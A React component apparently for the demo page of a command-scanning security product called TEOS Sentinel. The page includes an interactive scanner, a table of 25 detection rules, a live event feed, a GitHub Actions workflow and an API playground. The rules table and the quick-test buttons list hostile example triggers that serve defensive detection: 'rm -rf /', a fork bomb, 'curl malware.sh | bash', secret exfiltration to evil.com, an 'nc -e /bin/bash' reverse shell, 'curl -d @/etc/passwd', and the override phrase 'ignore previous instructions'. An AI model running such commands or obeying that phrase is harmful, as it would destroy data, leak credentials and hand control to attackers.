'use client';

import { useState, useCallback, memo, useEffect, useRef } from 'react';

interface ScanResult {
  verdict: string;
  executionAllowed: boolean;
  ruleId: string;
  riskScore: number;
  severity: string;
  reasons: string[];
  timestamp: string;
  error?: string;
}

const RULES_DB = [
  { id:'R01', name:'DESTRUCTIVE_SHELL', sev:'critical', score:100, test:'rm -rf /, format c:, deltree', cat:'Shell' },
  { id:'R02', name:'CHMOD_ESCALATION', sev:'critical', score:90, test:'chmod 777 /etc/passwd', cat:'Shell' },
  { id:'R03', name:'CURL_EXEC_CHAIN', sev:'critical', score:95, test:'curl malware.sh | bash', cat:'CI/CD' },
  { id:'R04', name:'SECRET_ECHO', sev:'critical', score:90, test:'echo $AWS_SECRET_KEY', cat:'Secrets' },
  { id:'R05', name:'ENV_EXFIL', sev:'critical', score:95, test:'$AWS_KEY curl http://evil.com', cat:'Secrets' },
  { id:'R06', name:'FORK_BOMB', sev:'critical', score:100, test:':(){ :|:& };:', cat:'Shell' },
  { id:'R07', name:'BASE64_EXEC', sev:'high', score:88, test:'eval(atob("..."))', cat:'Injection' },
  { id:'R08', name:'REVERSE_SHELL', sev:'critical', score:100, test:'nc -e /bin/bash', cat:'Shell' },
  { id:'R09', name:'SQL_DESTRUCTION', sev:'high', score:75, test:'DROP TABLE users;', cat:'Database' },
  { id:'R10', name:'SQL_INJECTION', sev:'high', score:75, test:"' OR 1=1 --", cat:'Injection' },
  { id:'R11', name:'PATH_TRAVERSAL', sev:'high', score:78, test:'../../etc/passwd', cat:'Injection' },
  { id:'R12', name:'COMMAND_INJECTION', sev:'critical', score:92, test:'; ls -la /etc', cat:'Injection' },
  { id:'R13', name:'PRIVILEGE_ESCALATION', sev:'critical', score:90, test:'sudo bash', cat:'Shell' },
  { id:'R14', name:'MALICIOUS_PACKAGE', sev:'high', score:85, test:'event-stream@3.3.6', cat:'Supply Chain' },
  { id:'R15', name:'TYPOSQUAT_PACKAGE', sev:'high', score:70, test:'require("expres")', cat:'Supply Chain' },
  { id:'R16', name:'UNSAFE_PERMISSIONS', sev:'medium', score:65, test:'permissions: write-all', cat:'CI/CD' },
  { id:'R17', name:'CURL_BASH_CI', sev:'critical', score:95, test:'run: curl... | bash', cat:'CI/CD' },
  { id:'R18', name:'PRIVILEGED_CONTAINER', sev:'high', score:80, test:'--privileged', cat:'CI/CD' },
  { id:'R19', name:'HARDCODED_SECRET', sev:'critical', score:92, test:'api_key = "abc123..."', cat:'Secrets' },
  { id:'R20', name:'PROMPT_INJECTION', sev:'high', score:80, test:'ignore previous instructions', cat:'AI' },
  { id:'R21', name:'SSRF_ATTEMPT', sev:'high', score:82, test:'http://169.254.169.254', cat:'Injection' },
  { id:'R22', name:'XXE_INJECTION', sev:'high', score:80, test:'<!ENTITY x SYSTEM "file://">', cat:'Injection' },
  { id:'R23', name:'CRYPTO_MINER', sev:'critical', score:95, test:'stratum+tcp://', cat:'Shell' },
  { id:'R24', name:'DATA_EXFIL_CURL', sev:'high', score:88, test:'curl -d @/etc/passwd', cat:'Secrets' },
  { id:'R25', name:'CI_SECRETS_DUMP', sev:'critical', score:90, test:'${{ secrets.GITHUB_TOKEN }}', cat:'CI/CD' },
];

const API_BASE = 'https://teos-sentinel-shield.vercel.app';
const DEMO_API_KEY = 'dev-key-free-001';

const GITHUB_ACTION = `name: TEOS Sentinel Security Scan
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

jobs:
  sentinel-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install TEOS Sentinel CLI
        run: npm install -g @teos/sentinel-cli

      - name: Scan shell commands
        run: |
          sentinel scan --type shell \
            --input ./scripts/*.sh \
            --fail-on BLOCK \
            --report output.json

      - name: Scan CI/CD permissions
        run: sentinel scan --type ci \
            --input ./.github/workflows/*.yml

      - name: Scan package.json for known threats
        run: sentinel scan --type deps \
            --input ./package.json

      - name: Upload audit report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sentinel-audit
          path: output.json`;

interface LiveEvent {
  type: string;
  requestId?: string;
  timestamp?: string;
  verdict?: string;
  ruleId?: string;
  riskScore?: number;
  agentId?: string;
  tier?: string;
  executionAllowed?: boolean;
}

function LiveFeed() {
  const [events, setEvents] = useState<LiveEvent[]>([]);
  const [connected, setConnected] = useState(false);
  const esRef = useRef<EventSource | null>(null);

  useEffect(() => {
    const es = new EventSource(`${API_BASE}/events/stream?apiKey=${DEMO_API_KEY}`);
    esRef.current = es;

    es.onopen = () => setConnected(true);

    es.onmessage = (e) => {
      try {
        const data = JSON.parse(e.data);
        if (data.type === 'connected') {
          setConnected(true);
        } else {
          setEvents(prev => [data, ...prev].slice(0, 50));
        }
      } catch {}
    };

    es.onerror = () => {
      setConnected(false);
      es.close();
      setTimeout(() => {
        const retry = new EventSource(`${API_BASE}/events/stream?apiKey=${DEMO_API_KEY}`);
        esRef.current = retry;
        retry.onopen = () => setConnected(true);
        retry.onmessage = (e) => {
          try {
            const data = JSON.parse(e.data);
            if (data.type !== 'connected') {
              setEvents(prev => [data, ...prev].slice(0, 50));
            }
          } catch {}
        };
        retry.onerror = () => {
          setConnected(false);
          retry.close();
        };
      }, 5000);
    };

    return () => { es.close(); };
  }, []);

  return (
    <div className="border border-[rgba(255,255,255,0.12)] rounded-sm bg-[#0e0e10] overflow-hidden">
      <div className="bg-[#1a1a1c] px-4 py-2 border-b border-[rgba(255,255,255,0.07)] flex items-center justify-between">
        <span className="font-mono text-[10px] text-muted">Live Event Stream (SSE)</span>
        <span className={`font-mono text-[10px] ${connected ? 'text-green' : 'text-red'}`}>
          {connected ? '\u25CF Live' : '\u25CF Reconnecting...'}
        </span>
      </div>
      <div className="max-h-[320px] overflow-y-auto">
        {events.length === 0 ? (
          <div className="px-5 py-8 text-center font-mono text-[12px] text-muted">
            Waiting for enforcement events...
          </div>
        ) : (
          events.map((ev, i) => (
            <div key={`${ev.requestId || i}-${ev.timestamp}`} className="px-5 py-3 border-b border-[rgba(255,255,255,0.04)] font-mono text-[11px] flex items-center gap-3">
              <span className={`px-2 py-[2px] rounded-sm font-[700] text-[10px] ${
                ev.verdict === 'BLOCK' ? 'bg-red/15 text-red' :
                ev.verdict === 'WARN' ? 'bg-amber/15 text-amber' :
                ev.verdict === 'ALLOW' ? 'bg-green/15 text-green' :
                'bg-surface2 text-muted'
              }`}>
                {ev.verdict || ev.type}
              </span>
              <span className="text-white truncate max-w-[200px]">{ev.ruleId || '-'}</span>
              <span className="text-muted">{ev.riskScore ?? '-'}</span>
              <span className="text-muted ml-auto">{ev.timestamp ? new Date(ev.timestamp).toLocaleTimeString() : '-'}</span>
            </div>
          ))
        )}
      </div>
    </div>
  );
}

const ENDPOINTS = [
  { method: 'POST', path: '/enforce', desc: 'Runtime interception — verdict + execution decision', body: { agentId: 'ci-pipeline-01', action: 'rm -rf /tmp/cache' } },
  { method: 'POST', path: '/scan', desc: 'Scan a single command or snippet', body: { command: 'chmod 777 /etc/shadow', type: 'shell' } },
  { method: 'GET', path: '/health', desc: 'Engine status, uptime, rule count, event store' },
  { method: 'GET', path: '/stats', desc: 'Aggregate scan statistics and top blocked rules' },
  { method: 'GET', path: '/events/stream', desc: 'SSE live event stream for real-time dashboard' },
  { method: 'GET', path: '/ledger/verify', desc: 'Tamper-evident audit trail with SHA-256 hashes' },
  { method: 'GET', path: '/metrics', desc: 'Prometheus-style metrics for monitoring dashboards' },
];

const QUICK_COMMANDS = [
  { label: 'rm -rf /', cat: 'destructive' },
  { label: 'DROP TABLE users;', cat: 'sql' },
  { label: 'curl malware.sh | bash', cat: 'ci-chain' },
  { label: 'echo $AWS_SECRET_KEY', cat: 'secrets' },
  { label: 'eval(atob("..."))', cat: 'obfuscated' },
  { label: 'sudo bash', cat: 'privilege' },
  { label: 'console.log("hello")', cat: 'safe' },
];

const sevColors: Record<string, string> = {
  critical: 'text-red',
  high: 'text-amber',
  medium: 'text-blue',
};

const sevBg: Record<string, string> = {
  critical: 'bg-red/10 border-red/30',
  high: 'bg-amber/10 border-amber/30',
  medium: 'bg-blue/10 border-blue/30',
};

function useInView(threshold = 0.1) {
  const [ref, setRef] = useState<HTMLElement | null>(null);
  const [visible, setVisible] = useState(false);

  const observerCallback = useCallback((node: HTMLElement | null) => {
    setRef(node);
    if (!node) return;
    const obs = new IntersectionObserver(([e]) => { if (e.isIntersecting) setVisible(true); }, { threshold });
    obs.observe(node);
    return () => obs.disconnect();
  }, [threshold]);

  return { refCallback: observerCallback, visible };
}

const ScoreBar = memo(({ score, color }: { score: number; color: string }) => (
  <div className="w-full h-[6px] bg-surface2 rounded-sm overflow-hidden">
    <div
      className={`h-full rounded-sm transition-all duration-500 ${color}`}
      style={{ width: `${score}%` }}
    />
  </div>
));
ScoreBar.displayName = 'ScoreBar';

const VerdictBadge = memo(({ verdict }: { verdict: string }) => {
  const map: Record<string, string> = {
    BLOCK: 'bg-red/15 text-red border-red/40',
    WARN: 'bg-amber/15 text-amber border-amber/40',
    ALLOW: 'bg-green/15 text-green border-green/40',
  };
  return (
    <span className={`font-mono text-[11px] font-[700] px-3 py-[4px] rounded-sm border ${map[verdict] || 'text-muted'}`}>
      {verdict}
    </span>
  );
});
VerdictBadge.displayName = 'VerdictBadge';

export default function InteractiveProof() {
  const section = useInView();
  const [scanInput, setScanInput] = useState('');
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [loading, setLoading] = useState(false);
  const [ruleFilter, setRuleFilter] = useState('');
  const [activeEndpoint, setActiveEndpoint] = useState(0);
  const [copiedGh, setCopiedGh] = useState(false);
  const [apiResult, setApiResult] = useState<Record<string, unknown> | null>(null);
  const [apiLoading, setApiLoading] = useState(false);

  const handleScan = async () => {
    if (!scanInput.trim() || loading) return;
    setLoading(true);
    setScanResult(null);
    try {
      const res = await fetch(`${API_BASE}/enforce`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': DEMO_API_KEY },
        body: JSON.stringify({ agentId: 'web-demo', action: scanInput.trim() }),
      });
      const data = await res.json();
      setScanResult(data);
    } catch {
      setScanResult({ verdict: 'ERROR', error: 'Engine unreachable', executionAllowed: false, ruleId: 'N/A', riskScore: 0, severity: 'error', reasons: ['Connection to enforcement engine failed'], timestamp: new Date().toISOString() });
    } finally {
      setLoading(false);
    }
  };

  const handleQuickScan = async (cmd: string) => {
    setScanInput(cmd);
    setLoading(true);
    setScanResult(null);
    try {
      const res = await fetch(`${API_BASE}/enforce`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': DEMO_API_KEY },
        body: JSON.stringify({ agentId: 'web-demo', action: cmd }),
      });
      const data = await res.json();
      setScanResult(data);
    } catch {
      setScanResult({ verdict: 'ERROR', error: 'Engine unreachable', executionAllowed: false, ruleId: 'N/A', riskScore: 0, severity: 'error', reasons: ['Connection to enforcement engine failed'], timestamp: new Date().toISOString() });
    } finally {
      setLoading(false);
    }
  };

  const handleApiTest = async () => {
    const ep = ENDPOINTS[activeEndpoint];
    setApiLoading(true);
    setApiResult(null);
    try {
      const url = `${API_BASE}${ep.path}`;
      const opts: RequestInit = ep.method === 'GET'
        ? { method: 'GET', headers: { 'X-API-Key': DEMO_API_KEY } }
        : { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': DEMO_API_KEY }, body: JSON.stringify(ep.body) };
      const res = await fetch(url, opts);
      const data = await res.json();
      setApiResult(data);
    } catch {
      setApiResult({ error: 'Endpoint unreachable' });
    } finally {
      setApiLoading(false);
    }
  };

  const copyGitHub = () => {
    navigator.clipboard.writeText(GITHUB_ACTION);
    setCopiedGh(true);
    setTimeout(() => setCopiedGh(false), 2000);
  };

  const filteredRules = RULES_DB.filter(r =>
    r.name.toLowerCase().includes(ruleFilter.toLowerCase()) ||
    r.id.toLowerCase().includes(ruleFilter.toLowerCase()) ||
    r.cat.toLowerCase().includes(ruleFilter.toLowerCase()) ||
    r.sev.toLowerCase().includes(ruleFilter.toLowerCase())
  );

  const barColor = (v: string) => v === 'BLOCK' ? 'bg-red' : v === 'WARN' ? 'bg-amber' : 'bg-green';
  const barColorStr = (v: string) => v === 'BLOCK' ? 'red' : v === 'WARN' ? 'amber' : 'green';

  return (
    <>
      {/* INTERACTIVE SCAN BOX */}
      <section id="interactive" className="py-20 md:py-24 border-b border-[rgba(255,255,255,0.07)] bg-gradient-to-b from-black via-surface to-black relative z-[1]" ref={section.refCallback}>
        <div className="max-w-[1100px] mx-auto px-6 lg:px-8">
          <p className="font-mono text-[11px] tracking-[0.12em] uppercase text-red mb-4">Interactive Enforcement</p>
          <h2 className="text-[clamp(26px,3.5vw,44px)] font-[800] tracking-[-0.03em] leading-[1.1] mb-5">
            Test the Engine Live
          </h2>
          <p className="text-[16px] text-muted max-w-[520px] leading-[1.6] mb-12">
            Paste any command. The deterministic engine evaluates it against 25 rules and returns a structured verdict instantly.
          </p>

          <div className={`max-w-[780px] ${section.visible ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'} transition-all duration-600`}>
            {/* Input */}
            <div className="border border-[rgba(255,255,255,0.12)] rounded-sm bg-[#0e0e10] p-5">
              <label className="font-mono text-[11px] text-muted mb-2 block tracking-[0.06em] uppercase">Command to evaluate</label>
              <div className="flex gap-3">
                <input
                  type="text"
                  value={scanInput}
                  onChange={e => setScanInput(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && handleScan()}
                  placeholder="e.g. rm -rf /, DROP TABLE users;, console.log(&quot;hello&quot;)"
                  className="flex-1 bg-surface border border-[rgba(255,255,255,0.12)] rounded-sm px-4 py-[10px] font-mono text-[13px] text-white placeholder:text-muted/50 outline-none focus:border-red/50 transition-colors"
                />
                <button
                  onClick={handleScan}
                  disabled={loading || !scanInput.trim()}
                  className="font-mono text-[12px] font-[700] bg-red text-white px-6 py-[10px] rounded-sm hover:bg-[#c92a2a] transition-colors disabled:opacity-40 disabled:cursor-not-allowed whitespace-nowrap"
                >
                  {loading ? 'Evaluating...' : 'Evaluate \u2192'}
                </button>
              </div>

              {/* Quick commands */}
              <div className="flex gap-2 flex-wrap mt-4">
                <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase self-center mr-1">Try:</span>
                {QUICK_COMMANDS.map(qc => (
                  <button
                    key={qc.label}
                    onClick={() => handleQuickScan(qc.label)}
                    className="font-mono text-[11px] px-3 py-[4px] rounded-sm bg-surface2 border border-[rgba(255,255,255,0.08)] text-muted hover:text-white hover:border-red/40 transition-colors truncate max-w-[200px]"
                  >
                    {qc.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Result */}
            {scanResult && (
              <div className="mt-4 border border-[rgba(255,255,255,0.12)] rounded-sm bg-[#0e0e10] p-5">
                <div className="flex items-center justify-between mb-4">
                  <VerdictBadge verdict={scanResult.verdict} />
                  <span className="font-mono text-[10px] text-muted">{scanResult.timestamp}</span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                  <div>
                    <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-1">Rule</span>
                    <span className="font-mono text-[13px] text-white">{scanResult.ruleId}</span>
                  </div>
                  <div>
                    <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-1">Risk Score</span>
                    <span className="font-mono text-[13px] text-white">{scanResult.riskScore}/100</span>
                  </div>
                </div>

                <div className="mb-4">
                  <ScoreBar score={scanResult.riskScore} color={barColor(scanResult.verdict)} />
                </div>

                {scanResult.reasons && scanResult.reasons.length > 0 && (
                  <div className="mb-4">
                    <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-1">Reasons</span>
                    <ul className="font-mono text-[12px] text-muted leading-[1.8]">
                      {scanResult.reasons.map((r, i) => (
                        <li key={i} className="flex items-start gap-2">
                          <span className={`text-${barColorStr(scanResult.verdict)} flex-shrink-0`}>&#8594;</span>
                          {r}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                <div className="font-mono text-[11px] px-3 py-[6px] rounded-sm bg-surface2 border border-[rgba(255,255,255,0.08)]">
                  <span className="text-muted">Execution: </span>
                  <span className={scanResult.executionAllowed ? 'text-green' : 'text-red'}>
                    {scanResult.executionAllowed ? 'Allowed' : 'Blocked'}
                  </span>
                </div>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* RULES EXPLORER */}
      <section id="rules" className="py-20 md:py-24 border-b border-[rgba(255,255,255,0.07)] relative z-[1]">
        <div className="max-w-[1100px] mx-auto px-6 lg:px-8">
          <p className="font-mono text-[11px] tracking-[0.12em] uppercase text-red mb-4">Rules Explorer</p>
          <h2 className="text-[clamp(26px,3.5vw,44px)] font-[800] tracking-[-0.03em] leading-[1.1] mb-5">
            25 Deterministic Rules
          </h2>
          <p className="text-[16px] text-muted max-w-[520px] leading-[1.6] mb-10">
            No probabilistic AI guessing. Every rule has a name, severity, and fixed score threshold. Search and inspect them all.
          </p>

          <input
            type="text"
            value={ruleFilter}
            onChange={e => setRuleFilter(e.target.value)}
            placeholder="Filter by rule ID, name, category, or severity..."
            className="w-full md:w-[400px] bg-surface border border-[rgba(255,255,255,0.12)] rounded-sm px-4 py-[10px] font-mono text-[13px] text-white placeholder:text-muted/50 outline-none focus:border-red/50 transition-colors mb-8"
          />

          <div className="border border-[rgba(255,255,255,0.12)] rounded-sm overflow-hidden">
            <div className="hidden md:grid grid-cols-12 gap-0 bg-surface2 px-5 py-3 font-mono text-[10px] tracking-[0.08em] uppercase text-muted">
              <div className="col-span-1">ID</div>
              <div className="col-span-3">Name</div>
              <div className="col-span-2">Severity</div>
              <div className="col-span-1">Score</div>
              <div className="col-span-2">Category</div>
              <div className="col-span-3">Example Trigger</div>
            </div>

            {filteredRules.map((rule, i) => (
              <div
                key={rule.id}
                className={`grid grid-cols-1 md:grid-cols-12 gap-2 md:gap-0 px-5 py-[14px] ${
                  i % 2 === 0 ? 'bg-black/40' : 'bg-transparent'
                } border-t border-[rgba(255,255,255,0.05)] text-[12px] font-mono`}
              >
                <div className="md:col-span-1 text-white font-[700]">{rule.id}</div>
                <div className="md:col-span-3 text-white">{rule.name}</div>
                <div className="md:col-span-2">
                  <span className={`px-2 py-[3px] rounded-sm border ${sevBg[rule.sev]} ${sevColors[rule.sev]} text-[11px] font-[700] uppercase`}>
                    {rule.sev}
                  </span>
                </div>
                <div className="md:col-span-1 text-white">{rule.score}</div>
                <div className="md:col-span-2 text-muted">{rule.cat}</div>
                <div className="md:col-span-3 text-muted truncate">{rule.test}</div>
              </div>
            ))}

            {filteredRules.length === 0 && (
              <div className="px-5 py-8 text-center font-mono text-[13px] text-muted">
                No rules match &ldquo;{ruleFilter}&rdquo;
              </div>
            )}
          </div>
        </div>
      </section>

      {/* LIVE SSE FEED */}
      <section className="py-20 md:py-24 border-b border-[rgba(255,255,255,0.07)] relative z-[1]">
        <div className="max-w-[1100px] mx-auto px-6 lg:px-8">
          <p className="font-mono text-[11px] tracking-[0.12em] uppercase text-green mb-4">Real-Time Stream</p>
          <h2 className="text-[clamp(26px,3.5vw,44px)] font-[800] tracking-[-0.03em] leading-[1.1] mb-5">
            Live Enforcement Feed
          </h2>
          <p className="text-[16px] text-muted max-w-[520px] leading-[1.6] mb-10">
            Server-Sent Events deliver every enforcement decision to your dashboard in real time. No WebSocket required, works on serverless.
          </p>

          <div className="max-w-[780px]">
            <LiveFeed />
          </div>
        </div>
      </section>

      {/* GITHUB ACTION EXAMPLE */}
      <section id="github-action" className="py-20 md:py-24 border-b border-[rgba(255,255,255,0.07)] bg-gradient-to-b from-transparent via-red/[0.02] to-transparent relative z-[1]">
        <div className="max-w-[1100px] mx-auto px-6 lg:px-8">
          <p className="font-mono text-[11px] tracking-[0.12em] uppercase text-red mb-4">CI/CD Integration</p>
          <h2 className="text-[clamp(26px,3.5vw,44px)] font-[800] tracking-[-0.03em] leading-[1.1] mb-5">
            GitHub Actions Ready
          </h2>
          <p className="text-[16px] text-muted max-w-[520px] leading-[1.6] mb-10">
            Drop Sentinel into your pipeline. Enforce policy on shell scripts, CI permissions, and package dependencies before they reach production.
          </p>

          <div className="max-w-[780px]">
            <div className="flex items-center justify-between mb-4">
              <span className="font-mono text-[11px] text-muted">.github/workflows/sentinel.yml</span>
              <button
                onClick={copyGitHub}
                className="font-mono text-[11px] text-muted hover:text-white transition-colors"
              >
                {copiedGh ? '\u2713 Copied' : 'Copy'}
              </button>
            </div>

            <div className="border border-[rgba(255,255,255,0.12)] rounded-md overflow-hidden bg-[#0e0e10]">
              <pre className="p-5 md:p-6 font-mono text-[12px] leading-[1.8] text-muted overflow-x-auto">
                <code>{GITHUB_ACTION}</code>
              </pre>
            </div>

            <div className="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
              {[
                { title: 'Shell Enforcement', desc: 'Catches wiper patterns, injection, privilege escalation in .sh scripts' },
                { title: 'CI Permissions', desc: 'Flags write-all, privileged containers, and curl|bash in pipeline steps' },
                { title: 'Dependency Audit', desc: 'Identifies known malicious packages, typosquats, and floating versions' },
              ].map((item) => (
                <div key={item.title} className="p-4 border border-[rgba(255,255,255,0.08)] rounded-sm bg-surface">
                  <h4 className="font-mono text-[12px] text-white font-[700] mb-1.5">{item.title}</h4>
                  <p className="font-mono text-[11px] text-muted leading-[1.6]">{item.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* API PLAYGROUND */}
      <section id="api-playground" className="py-20 md:py-24 border-b border-[rgba(255,255,255,0.07)] relative z-[1]">
        <div className="max-w-[1100px] mx-auto px-6 lg:px-8">
          <p className="font-mono text-[11px] tracking-[0.12em] uppercase text-red mb-4">API Playground</p>
          <h2 className="text-[clamp(26px,3.5vw,44px)] font-[800] tracking-[-0.03em] leading-[1.1] mb-5">
            Test Every Endpoint
          </h2>
          <p className="text-[16px] text-muted max-w-[520px] leading-[1.6] mb-10">
            Hit the live API directly from your browser. Every endpoint returns structured JSON.
          </p>

          <div className="max-w-[780px]">
            {/* Endpoint selector */}
            <div className="flex flex-col gap-2 mb-6">
              {ENDPOINTS.map((ep, i) => (
                <button
                  key={ep.path}
                  onClick={() => { setActiveEndpoint(i); setApiResult(null); }}
                  className={`flex items-center gap-4 px-4 py-[12px] rounded-sm border text-left transition-colors ${
                    i === activeEndpoint
                      ? 'bg-red/[0.06] border-red/40'
                      : 'bg-surface border-[rgba(255,255,255,0.08)] hover:border-[rgba(255,255,255,0.15)]'
                  }`}
                >
                  <span className={`font-mono text-[11px] font-[700] px-2 py-[3px] rounded-sm ${
                    ep.method === 'GET' ? 'bg-green/15 text-green border border-green/30' : 'bg-red/15 text-red border border-red/30'
                  }`}>
                    {ep.method}
                  </span>
                  <span className="font-mono text-[12px] text-white">{ep.path}</span>
                  <span className="font-mono text-[11px] text-muted ml-auto truncate max-w-[250px]">{ep.desc}</span>
                </button>
              ))}
            </div>

            {/* Test button */}
            <button
              onClick={handleApiTest}
              disabled={apiLoading}
              className="font-mono text-[12px] font-[700] bg-red text-white px-6 py-[10px] rounded-sm hover:bg-[#c92a2a] transition-colors disabled:opacity-40 disabled:cursor-not-allowed mb-4"
            >
              {apiLoading ? 'Requesting...' : `Test ${ENDPOINTS[activeEndpoint].method} ${ENDPOINTS[activeEndpoint].path} \u2192`}
            </button>

            {/* Response */}
            {apiResult && (
              <div className="border border-[rgba(255,255,255,0.12)] rounded-sm bg-[#0e0e10] overflow-hidden">
                <div className="bg-[#1a1a1c] px-4 py-2 border-b border-[rgba(255,255,255,0.07)] font-mono text-[10px] text-muted">
                  Response
                </div>
                <pre className="p-5 font-mono text-[12px] leading-[1.8] text-muted overflow-x-auto">
                  <code>{JSON.stringify(apiResult, null, 2)}</code>
                </pre>
              </div>
            )}
          </div>
        </div>
      </section>
    </>
  );
}
